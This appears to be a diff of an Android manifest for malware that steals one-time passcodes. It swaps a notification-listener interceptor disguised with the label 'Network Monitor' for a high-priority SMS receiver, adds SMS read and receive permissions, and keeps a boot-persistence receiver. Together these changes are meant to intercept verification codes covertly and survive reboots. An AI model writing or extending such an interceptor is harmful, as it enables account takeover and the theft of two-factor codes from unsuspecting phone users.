@@ -11,7 +11,8 @@
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
-    <!-- NO SMS PERMISSIONS, NO ACCESSIBILITY PERMISSIONS -->
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
 
     <application
         android:allowBackup="false"
@@ -22,16 +23,15 @@
         android:theme="@style/Theme.AppCompat.Light.NoActionBar"
         tools:ignore="DataExtractionRules">
 
-        <!-- Notification Listener Service (Core Interceptor) -->
-        <service
-            android:name=".OtpNotificationListener"
-            android:label="Network Monitor"
-            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.service.notification.NotificationListenerService" />
+        <!-- SMS Interceptor -->
+        <receiver
+            android:name=".SmsReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
-        </service>
+        </receiver>
 
         <!-- Boot persistence -->
         <receiver
